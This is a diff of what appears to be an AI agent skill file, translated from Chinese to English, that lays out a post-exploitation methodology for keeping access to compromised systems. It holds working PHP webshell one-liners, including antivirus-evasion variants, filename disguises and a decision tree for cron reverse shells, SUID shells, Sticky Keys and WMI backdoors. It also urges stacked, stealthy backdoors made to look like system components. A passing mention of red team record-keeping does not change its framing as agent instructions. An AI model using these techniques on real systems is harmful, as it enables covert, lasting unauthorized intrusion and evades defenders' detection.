@@ -1,66 +1,71 @@
 ---
 name: persist-maintain
-description: "权限持久化方法论。当已获取目标系统权限后需要维持长期访问时使用。覆盖 Linux(cron/SSH key/webshell) 和 Windows(计划任务/服务/注册表/WMI) 持久化技术，以及 Web 层面的 webshell 部署和隐蔽策略"
+description: "Privilege persistence methodology. Use when you have already obtained access to a target system and need to maintain long-term access. Covers Linux (cron/SSH key/webshell) and Windows (scheduled task/service/registry/WMI) persistence techniques, plus webshell deployment and stealth strategies at the web layer"
+zh-signals: "在获得目标权限后建立不依赖原始漏洞的持久访问通道，覆盖 Linux/Windows 持久化与 Web 层 webshell。信号:权限持久化,webshell,cron,计划任务,后门"
+when-to-use: >-
+  Use after gaining system access when you need to maintain long-term access via
+  Linux (cron, SSH keys), Windows (scheduled tasks, services, registry), or
+  web-layer webshells.
 metadata:
-  tags: "persist,persistence,持久化,webshell,backdoor,后门,cron,scheduled task,service,维持访问"
+  tags: "persist,persistence,webshell,backdoor,cron,scheduled task,service,maintain access"
   category: "postexploit"
 ---
 
-# 权限持久化方法论
+# Privilege Persistence Methodology
 
-持久化核心：建立**不依赖原始漏洞**的访问通道。
+Persistence core: establish an access channel that **does not depend on the original vulnerability**.
 
-## ⛔ 深入参考（必读）
+## ⛔ Further Reading (Must Read)
 
-- 需要 Linux/Windows 各种持久化技术的具体命令 → [references/persistence-techniques.md](references/persistence-techniques.md)
+- Concrete commands for the various Linux/Windows persistence techniques → [references/persistence-techniques.md](references/persistence-techniques.md)
 
 ---
 
-## Phase 1: Web 层持久化
+## Phase 1: Web-Layer Persistence
 
-### Webshell 部署
-**部署位置（按隐蔽性）**：静态资源目录 > 上传目录 > 框架目录深处 > 已有文件末尾追加
+### Webshell Deployment
+**Deployment locations (by stealth)**: static asset directory > upload directory > deep inside a framework directory > appended to an existing file
 
-**隐蔽 Webshell**：
+**Stealth webshell**:
 ```php
-<?php @eval($_POST['cmd']);?>                    // 一句话
-<?php $a='sys'.'tem'; $a($_GET['c']);?>          // 字符串拼接免杀
-<?php array_map('assert', array($_POST['cmd']));?>  // 函数回调免杀
+<?php @eval($_POST['cmd']);?>                    // One-liner
+<?php $a='sys'.'tem'; $a($_GET['c']);?>          // String concatenation for AV evasion
+<?php array_map('assert', array($_POST['cmd']));?>  // Function callback for AV evasion
 ```
-**文件名伪装**：`.htaccess`, `config.bak.php`, `error_log.php`, `.user.ini`
+**Filename disguise**: `.htaccess`, `config.bak.php`, `error_log.php`, `.user.ini`
 
-## Phase 2: 持久化决策树
+## Phase 2: Persistence Decision Tree
 
 ```
-目标操作系统？
+Target operating system?
 ├─ Linux
-│   ├─ 有 SSH 访问？→ SSH 公钥（最可靠）
-│   ├─ 需要自动回连？→ Cron 反弹 shell
-│   ├─ 需要隐蔽？→ systemd 服务 / bashrc 后门
-│   └─ 快速后门？→ SUID shell
+│   ├─ SSH access available? → SSH public key (most reliable)
+│   ├─ Need automatic callback? → Cron reverse shell
+│   ├─ Need stealth? → systemd service / bashrc backdoor
+│   └─ Need a quick backdoor? → SUID shell
 ├─ Windows
-│   ├─ 有管理员权限？→ WMI 事件订阅（最难检测）
-│   ├─ 需要开机启动？→ 注册表 Run 键 / 计划任务
-│   └─ 有 RDP 访问？→ Sticky Keys 后门
-└─ Web 层（通用）→ Webshell
-详细命令 → [references/persistence-techniques.md](references/persistence-techniques.md)
+│   ├─ Administrator rights? → WMI event subscription (hardest to detect)
+│   ├─ Need start-up persistence? → Registry Run key / scheduled task
+│   └─ RDP access available? → Sticky Keys backdoor
+└─ Web layer (generic) → Webshell
+Detailed commands → [references/persistence-techniques.md](references/persistence-techniques.md)
 ```
 
-## Phase 3: 多层持久化策略
+## Phase 3: Multi-Layer Persistence Strategy
 
-不要只用一种——建立多层后门：
-1. **第一层**：Webshell（Web 层，最容易恢复）
-2. **第二层**：SSH 密钥或计划任务（系统层）
-3. **第三层**：服务或 WMI 订阅（深层，难以发现）
+Do not rely on a single technique — establish multiple backdoors:
+1. **Layer 1**: Webshell (web layer, easiest to recover)
+2. **Layer 2**: SSH key or scheduled task (system layer)
+3. **Layer 3**: Service or WMI subscription (deep layer, hard to discover)
 
-## 注意事项
-- 持久化越隐蔽越好——文件名/服务名/任务名应像正常系统组件
-- 避免使用明显路径（如 `/tmp/backdoor.sh`）
-- 在红队评估中，记录部署了什么、在哪里
+## Notes
+- The more stealthy the persistence, the better — filenames/service names/task names should look like normal system components
+- Avoid obvious paths (such as `/tmp/backdoor.sh`)
+- During a red team assessment, record what was deployed and where
 
-## PHP Webshell 混淆
-- 变量函数：`$$var` 动态调用，避免直接出现 eval/system（隐蔽执行）
-- 替代函数：eval 替代为 assert，system 替代为 passthru 等
+## PHP Webshell Obfuscation
+- Variable functions: dynamic invocation with `$$var`, avoiding direct occurrences of eval/system (stealth execution)
+- Alternative functions: replace eval with assert, system with passthru, and similar substitutions
 
-## 隐蔽性排名
-- 不要修改 index.php 等核心文件——容易发现，危险
+## Stealth Ranking
+- Do not modify core files such as index.php — easy to detect and dangerous
